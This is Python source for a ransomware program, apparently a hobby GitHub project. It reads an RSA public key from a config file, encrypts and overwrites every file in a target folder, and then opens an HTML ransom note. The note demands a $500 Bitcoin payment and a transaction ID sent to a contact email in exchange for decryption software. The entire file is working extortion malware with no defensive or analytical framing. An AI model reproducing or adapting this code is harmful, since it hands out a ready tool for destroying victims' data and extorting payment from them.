import json
import os
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.backends import default_backend
import uuid
import sys
import webbrowser
root_path = r'C:\Users\Usuario\Desktop\GitHub_Projects\ransomware\files'


def read_configuration():
    with open(resource_path('config.json'), 'r') as f:
        config = json.load(f)
    return config['hostage_id'], config['public_key']

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)



def generate_html(hostage_id):
    html_string = f"""
                    <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
                    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+" crossorigin="anonymous"></script>
                    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
                    <title>You files have been encrypted!</title>
                </head>
                <body>
                    <div class="container bg-light align-content-center">
                        <div class="card">
                            <div class="card-header">
                                Your files have been Encrypted!
                            </div>
                            <div class="card-body">
                                <div class="col">
                                    <div class="row">
                                        You have to make a $500 Bitcoin payment on this wallet:
                                        "3FZbgi29cpjq2GjdwVgi29cp" and send your transaction id to this email: "polkax@hostage.xyz" and your hostage id.
                                        We'll send you a message with a new software to decrypt your information.
                                    </div>
                                    
                                </div>
                            </div>
                            <div class="card-footer">
                                <div class="col">
                                    <div class="row">
                                        Hostage ID: {hostage_id}
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                    </div>
                </body>
                </html>
    """
    return html_string

def encrypt(public_key_pem, data):
    try:
        public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
        encrypted_chunks = []
        chunk_size = 190 
        
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            encrypted_chunk = public_key.encrypt(
                chunk,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            encrypted_chunks.append(encrypted_chunk)
        
        encrypted_data = b''.join(encrypted_chunks)
        return encrypted_data
    
    except Exception:
        
        return b""

if __name__ == "__main__":
    
    hostage_id, public_key = read_configuration()
    items = os.listdir(root_path)
    full_path = [os.path.join(root_path, item) for item in items]
    html_string = generate_html(hostage_id)
        
    for item in full_path:
        try:
            with open(item, 'rb') as file:
                file_data = file.read()
            
            encrypted_data = encrypt(public_key.encode(), file_data)

            if encrypted_data:
                with open(item, 'wb') as file:
                    file.write(encrypted_data)
               
            else:
                print(f"Failed to encrypt: {item}")
            
        except Exception as e:
            print(f"Error encrypting file {item}: {e}")
        
        
    with open('encrypted_files_notice.html', 'w') as f:
        f.write(html_string)
        

    
    webbrowser.open('encrypted_files_notice.html')